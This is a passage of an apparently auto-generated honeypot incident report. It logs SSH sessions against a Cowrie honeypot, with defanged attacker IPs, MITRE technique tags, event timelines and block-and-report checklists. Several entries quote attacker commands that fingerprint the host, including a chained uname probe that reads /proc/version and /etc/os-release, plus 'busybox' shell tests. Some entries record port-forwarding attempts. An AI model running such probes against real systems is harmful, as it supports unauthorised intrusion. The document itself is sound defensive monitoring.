- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e9690997ab5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 18:08 |
| **Last Seen** | 2026-07-12 18:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:08:53` | `cowrie.session.connect` |
| `2026-07-12 18:08:53` | `cowrie.client.version` |
| `2026-07-12 18:08:53` | `cowrie.client.kex` |
| `2026-07-12 18:08:54` | `cowrie.login.success` |
| `2026-07-12 18:08:55` | `cowrie.session.params` |
| `2026-07-12 18:08:55` | `cowrie.command.input` |
| `2026-07-12 18:08:55` | `cowrie.command.input` |
| `2026-07-12 18:08:55` | `cowrie.command.input` |
| `2026-07-12 18:08:55` | `cowrie.command.input` |
| `2026-07-12 18:08:55` | `cowrie.command.input` |
| `2026-07-12 18:08:55` | `cowrie.command.success` |
| `2026-07-12 18:08:55` | `cowrie.command.input` |
| `2026-07-12 18:08:55` | `cowrie.command.input` |
| `2026-07-12 18:08:55` | `cowrie.command.input` |
| `2026-07-12 18:08:55` | `cowrie.command.input` |
| `2026-07-12 18:08:55` | `cowrie.log.closed` |
| `2026-07-12 18:08:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f0076196f9f

| Field | Detail |
|---|---|
| **Source IP** | `121.128.84[.]224` |
| **First Seen** | 2026-07-12 18:08 |
| **Last Seen** | 2026-07-12 18:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:08:58` | `cowrie.session.connect` |
| `2026-07-12 18:08:58` | `cowrie.client.version` |
| `2026-07-12 18:08:58` | `cowrie.client.kex` |
| `2026-07-12 18:09:00` | `cowrie.login.success` |
| `2026-07-12 18:09:01` | `cowrie.direct-tcpip.request` |
| `2026-07-12 18:09:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.128.84[.]224` to AbuseIPDB if not already reported
- [ ] Block `121.128.84[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-720104ff15c1

| Field | Detail |
|---|---|
| **Source IP** | `103.111.6[.]121` |
| **First Seen** | 2026-07-12 18:09 |
| **Last Seen** | 2026-07-12 18:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:09:10` | `cowrie.session.connect` |
| `2026-07-12 18:09:11` | `cowrie.client.version` |
| `2026-07-12 18:09:11` | `cowrie.client.kex` |
| `2026-07-12 18:09:13` | `cowrie.login.success` |
| `2026-07-12 18:09:14` | `cowrie.direct-tcpip.request` |
| `2026-07-12 18:09:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.111.6[.]121` to AbuseIPDB if not already reported
- [ ] Block `103.111.6[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba5df18d6495

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 18:11 |
| **Last Seen** | 2026-07-12 18:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:11:15` | `cowrie.session.connect` |
| `2026-07-12 18:11:15` | `cowrie.client.version` |
| `2026-07-12 18:11:15` | `cowrie.client.kex` |
| `2026-07-12 18:11:17` | `cowrie.login.success` |
| `2026-07-12 18:11:18` | `cowrie.session.params` |
| `2026-07-12 18:11:18` | `cowrie.command.input` |
| `2026-07-12 18:11:18` | `cowrie.command.input` |
| `2026-07-12 18:11:18` | `cowrie.command.input` |
| `2026-07-12 18:11:18` | `cowrie.command.input` |
| `2026-07-12 18:11:18` | `cowrie.command.input` |
| `2026-07-12 18:11:18` | `cowrie.command.success` |
| `2026-07-12 18:11:18` | `cowrie.command.input` |
| `2026-07-12 18:11:18` | `cowrie.command.input` |
| `2026-07-12 18:11:18` | `cowrie.command.input` |
| `2026-07-12 18:11:18` | `cowrie.command.input` |
| `2026-07-12 18:11:18` | `cowrie.log.closed` |
| `2026-07-12 18:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e4edc2ba8d0

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]10` |
| **First Seen** | 2026-07-12 18:15 |
| **Last Seen** | 2026-07-12 18:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:15:14` | `cowrie.session.connect` |
| `2026-07-12 18:15:14` | `cowrie.login.success` |
| `2026-07-12 18:15:14` | `cowrie.session.params` |
| `2026-07-12 18:15:15` | `cowrie.command.input` |
| `2026-07-12 18:15:16` | `cowrie.command.input` |
| `2026-07-12 18:15:16` | `cowrie.command.input` |
| `2026-07-12 18:15:17` | `cowrie.command.input` |
| `2026-07-12 18:15:17` | `cowrie.command.failed` |
| `2026-07-12 18:15:17` | `cowrie.log.closed` |
| `2026-07-12 18:15:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]10` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d8cf83f972f

| Field | Detail |
|---|---|
| **Source IP** | `185.112.148[.]66` |
| **First Seen** | 2026-07-12 18:24 |
| **Last Seen** | 2026-07-12 18:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:24:17` | `cowrie.session.connect` |
| `2026-07-12 18:24:18` | `cowrie.client.version` |
| `2026-07-12 18:24:18` | `cowrie.client.kex` |
| `2026-07-12 18:24:20` | `cowrie.login.success` |
| `2026-07-12 18:24:20` | `cowrie.direct-tcpip.request` |
| `2026-07-12 18:24:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.148[.]66` to AbuseIPDB if not already reported
- [ ] Block `185.112.148[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77b69962d123

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-12 18:26 |
| **Last Seen** | 2026-07-12 18:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:26:44` | `cowrie.session.connect` |
| `2026-07-12 18:26:44` | `cowrie.client.version` |
| `2026-07-12 18:26:44` | `cowrie.client.kex` |
| `2026-07-12 18:26:48` | `cowrie.login.success` |
| `2026-07-12 18:26:50` | `cowrie.session.params` |
| `2026-07-12 18:26:50` | `cowrie.command.input` |
| `2026-07-12 18:26:51` | `cowrie.log.closed` |
| `2026-07-12 18:26:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-933efac31fc1

| Field | Detail |
|---|---|
| **Source IP** | `50.217.255[.]171` |
| **First Seen** | 2026-07-12 18:29 |
| **Last Seen** | 2026-07-12 18:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:29:53` | `cowrie.session.connect` |
| `2026-07-12 18:29:54` | `cowrie.client.version` |
| `2026-07-12 18:29:54` | `cowrie.client.kex` |
| `2026-07-12 18:29:55` | `cowrie.login.success` |
| `2026-07-12 18:29:56` | `cowrie.direct-tcpip.request` |
| `2026-07-12 18:30:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.255[.]171` to AbuseIPDB if not already reported
- [ ] Block `50.217.255[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3b52e942d9e

| Field | Detail |
|---|---|
| **Source IP** | `188.226.132[.]113` |
| **First Seen** | 2026-07-12 18:30 |
| **Last Seen** | 2026-07-12 18:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:30:05` | `cowrie.session.connect` |
| `2026-07-12 18:30:06` | `cowrie.client.version` |
| `2026-07-12 18:30:06` | `cowrie.client.kex` |
| `2026-07-12 18:30:06` | `cowrie.login.success` |
| `2026-07-12 18:30:07` | `cowrie.direct-tcpip.request` |
| `2026-07-12 18:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.226.132[.]113` to AbuseIPDB if not already reported
- [ ] Block `188.226.132[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a5820f47486

| Field | Detail |
|---|---|
| **Source IP** | `34.41.211[.]48` |
| **First Seen** | 2026-07-12 18:34 |
| **Last Seen** | 2026-07-12 18:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:34:44` | `cowrie.session.connect` |
| `2026-07-12 18:34:44` | `cowrie.client.version` |
| `2026-07-12 18:34:44` | `cowrie.client.kex` |
| `2026-07-12 18:34:46` | `cowrie.login.success` |
| `2026-07-12 18:34:46` | `cowrie.direct-tcpip.request` |
| `2026-07-12 18:34:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.41.211[.]48` to AbuseIPDB if not already reported
- [ ] Block `34.41.211[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9428488e828e

| Field | Detail |
|---|---|
| **Source IP** | `182.75.227[.]178` |
| **First Seen** | 2026-07-12 18:34 |
| **Last Seen** | 2026-07-12 18:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:34:52` | `cowrie.session.connect` |
| `2026-07-12 18:34:52` | `cowrie.client.version` |
| `2026-07-12 18:34:52` | `cowrie.client.kex` |
| `2026-07-12 18:34:55` | `cowrie.login.success` |
| `2026-07-12 18:34:55` | `cowrie.direct-tcpip.request` |
| `2026-07-12 18:35:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.227[.]178` to AbuseIPDB if not already reported
- [ ] Block `182.75.227[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-804140df0527

| Field | Detail |
|---|---|
| **Source IP** | `112.27.38[.]203` |
| **First Seen** | 2026-07-12 18:38 |
| **Last Seen** | 2026-07-12 18:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:38:13` | `cowrie.session.connect` |
| `2026-07-12 18:38:14` | `cowrie.client.version` |
| `2026-07-12 18:38:14` | `cowrie.client.kex` |
| `2026-07-12 18:38:16` | `cowrie.login.success` |
| `2026-07-12 18:38:17` | `cowrie.direct-tcpip.request` |
| `2026-07-12 18:38:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.27.38[.]203` to AbuseIPDB if not already reported
- [ ] Block `112.27.38[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a0205f4f7b9

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-12 18:40 |
| **Last Seen** | 2026-07-12 18:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:40:51` | `cowrie.session.connect` |
| `2026-07-12 18:40:52` | `cowrie.client.version` |
| `2026-07-12 18:40:52` | `cowrie.client.kex` |
| `2026-07-12 18:40:55` | `cowrie.login.success` |
| `2026-07-12 18:40:56` | `cowrie.session.params` |
| `2026-07-12 18:40:56` | `cowrie.command.input` |
| `2026-07-12 18:40:56` | `cowrie.log.closed` |
| `2026-07-12 18:40:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dce2a91e4f5

| Field | Detail |
|---|---|
| **Source IP** | `220.80.219[.]163` |
| **First Seen** | 2026-07-12 18:46 |
| **Last Seen** | 2026-07-12 18:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:46:37` | `cowrie.session.connect` |
| `2026-07-12 18:46:38` | `cowrie.client.version` |
| `2026-07-12 18:46:38` | `cowrie.client.kex` |
| `2026-07-12 18:46:40` | `cowrie.login.success` |
| `2026-07-12 18:46:41` | `cowrie.direct-tcpip.request` |
| `2026-07-12 18:46:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.219[.]163` to AbuseIPDB if not already reported
- [ ] Block `220.80.219[.]163` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-173665d542d8

| Field | Detail |
|---|---|
| **Source IP** | `110.14.192[.]20` |
| **First Seen** | 2026-07-12 18:46 |
| **Last Seen** | 2026-07-12 18:47 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:46:47` | `cowrie.session.connect` |
| `2026-07-12 18:46:48` | `cowrie.client.version` |
| `2026-07-12 18:46:48` | `cowrie.client.kex` |
| `2026-07-12 18:46:52` | `cowrie.login.success` |
| `2026-07-12 18:46:54` | `cowrie.direct-tcpip.request` |
| `2026-07-12 18:47:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.14.192[.]20` to AbuseIPDB if not already reported
- [ ] Block `110.14.192[.]20` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f9b208e8ddb

| Field | Detail |
|---|---|
| **Source IP** | `121.137.29[.]114` |
| **First Seen** | 2026-07-12 18:48 |
| **Last Seen** | 2026-07-12 18:49 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:48:59` | `cowrie.session.connect` |
| `2026-07-12 18:49:00` | `cowrie.login.success` |
| `2026-07-12 18:49:01` | `cowrie.login.success` |
| `2026-07-12 18:49:02` | `cowrie.session.params` |
| `2026-07-12 18:49:02` | `cowrie.command.input` |
| `2026-07-12 18:49:02` | `cowrie.command.failed` |
| `2026-07-12 18:49:03` | `cowrie.command.input` |
| `2026-07-12 18:49:03` | `cowrie.command.failed` |
| `2026-07-12 18:49:03` | `cowrie.command.input` |
| `2026-07-12 18:49:03` | `cowrie.command.input` |
| `2026-07-12 18:49:03` | `cowrie.command.failed` |
| `2026-07-12 18:49:03` | `cowrie.command.failed` |
| `2026-07-12 18:49:34` | `cowrie.log.closed` |
| `2026-07-12 18:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.137.29[.]114` to AbuseIPDB if not already reported
- [ ] Block `121.137.29[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9702ddc41eb8

| Field | Detail |
|---|---|
| **Source IP** | `121.137.29[.]114` |
| **First Seen** | 2026-07-12 18:49 |
| **Last Seen** | 2026-07-12 18:50 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:49:34` | `cowrie.session.connect` |
| `2026-07-12 18:49:35` | `cowrie.login.success` |
| `2026-07-12 18:49:36` | `cowrie.login.success` |
| `2026-07-12 18:49:36` | `cowrie.session.params` |
| `2026-07-12 18:49:36` | `cowrie.command.input` |
| `2026-07-12 18:49:36` | `cowrie.command.failed` |
| `2026-07-12 18:49:37` | `cowrie.command.input` |
| `2026-07-12 18:49:37` | `cowrie.command.failed` |
| `2026-07-12 18:49:37` | `cowrie.command.input` |
| `2026-07-12 18:49:37` | `cowrie.command.input` |
| `2026-07-12 18:49:37` | `cowrie.command.failed` |
| `2026-07-12 18:49:37` | `cowrie.command.failed` |
| `2026-07-12 18:50:08` | `cowrie.log.closed` |
| `2026-07-12 18:50:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.137.29[.]114` to AbuseIPDB if not already reported
- [ ] Block `121.137.29[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07f99286f72c

| Field | Detail |
|---|---|
| **Source IP** | `121.137.29[.]114` |
| **First Seen** | 2026-07-12 18:50 |
| **Last Seen** | 2026-07-12 18:50 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:50:08` | `cowrie.session.connect` |
| `2026-07-12 18:50:09` | `cowrie.login.success` |
| `2026-07-12 18:50:09` | `cowrie.session.params` |
| `2026-07-12 18:50:10` | `cowrie.command.input` |
| `2026-07-12 18:50:10` | `cowrie.command.failed` |
| `2026-07-12 18:50:10` | `cowrie.command.input` |
| `2026-07-12 18:50:10` | `cowrie.command.failed` |
| `2026-07-12 18:50:10` | `cowrie.command.input` |
| `2026-07-12 18:50:10` | `cowrie.command.failed` |
| `2026-07-12 18:50:11` | `cowrie.command.input` |
| `2026-07-12 18:50:11` | `cowrie.command.failed` |
| `2026-07-12 18:50:11` | `cowrie.command.input` |
| `2026-07-12 18:50:11` | `cowrie.command.input` |
| `2026-07-12 18:50:11` | `cowrie.command.failed` |
| `2026-07-12 18:50:11` | `cowrie.command.failed` |
| `2026-07-12 18:50:42` | `cowrie.log.closed` |
| `2026-07-12 18:50:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.137.29[.]114` to AbuseIPDB if not already reported
- [ ] Block `121.137.29[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e638b11c4e5b

| Field | Detail |
|---|---|
| **Source IP** | `61.145.181[.]7` |
| **First Seen** | 2026-07-12 18:50 |
| **Last Seen** | 2026-07-12 18:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:50:12` | `cowrie.session.connect` |
| `2026-07-12 18:50:12` | `cowrie.client.version` |
| `2026-07-12 18:50:12` | `cowrie.client.kex` |
| `2026-07-12 18:50:14` | `cowrie.login.success` |
| `2026-07-12 18:50:15` | `cowrie.direct-tcpip.request` |
| `2026-07-12 18:50:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.145.181[.]7` to AbuseIPDB if not already reported
- [ ] Block `61.145.181[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d53183cd7e8a

| Field | Detail |
|---|---|
| **Source IP** | `121.137.29[.]114` |
| **First Seen** | 2026-07-12 18:50 |
| **Last Seen** | 2026-07-12 18:51 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:50:42` | `cowrie.session.connect` |
| `2026-07-12 18:50:43` | `cowrie.login.success` |
| `2026-07-12 18:50:44` | `cowrie.login.success` |
| `2026-07-12 18:50:44` | `cowrie.session.params` |
| `2026-07-12 18:50:45` | `cowrie.command.input` |
| `2026-07-12 18:50:45` | `cowrie.command.failed` |
| `2026-07-12 18:50:45` | `cowrie.command.input` |
| `2026-07-12 18:50:45` | `cowrie.command.failed` |
| `2026-07-12 18:50:45` | `cowrie.command.input` |
| `2026-07-12 18:50:45` | `cowrie.command.input` |
| `2026-07-12 18:50:45` | `cowrie.command.failed` |
| `2026-07-12 18:50:45` | `cowrie.command.failed` |
| `2026-07-12 18:51:16` | `cowrie.log.closed` |
| `2026-07-12 18:51:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.137.29[.]114` to AbuseIPDB if not already reported
- [ ] Block `121.137.29[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-555c2c85fcf9

| Field | Detail |
|---|---|
| **Source IP** | `121.137.29[.]114` |
| **First Seen** | 2026-07-12 18:51 |
| **Last Seen** | 2026-07-12 18:51 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 18:51:16` | `cowrie.session.connect` |
| `2026-07-12 18:51:17` | `cowrie.login.success` |
| `2026-07-12 18:51:17` | `cowrie.session.params` |
| `2026-07-12 18:51:18` | `cowrie.command.input` |
| `2026-07-12 18:51:18` | `cowrie.command.failed` |
| `2026-07-12 18:51:18` | `cowrie.command.input` |
| `2026-07-12 18:51:18` | `cowrie.command.failed` |
| `2026-07-12 18:51:19` | `cowrie.command.input` |
| `2026-07-12 18:51:19` | `cowrie.command.failed` |
| `2026-07-12 18:51:19` | `cowrie.command.input` |
| `2026-07-12 18:51:19` | `cowrie.command.failed` |
| `2026-07-12 18:51:19` | `cowrie.command.input` |
| `2026-07-12 18:51:19` | `cowrie.command.input` |
| `2026-07-12 18:51:19` | `cowrie.command.failed` |
| `2026-07-12 18:51:19` | `cowrie.command.failed` |
| `2026-07-12 18:51:50` | `cowrie.log.closed` |
| `2026-07-12 18:51:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.137.29[.]114` to AbuseIPDB if not already reported
- [ ] Block `121.137.29[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ebad278a055

| Field | Detail |
|---|---|
| **Source IP** | `121.137.29[.]114` |
| **First Seen** | 2026-07-12 18:51 |
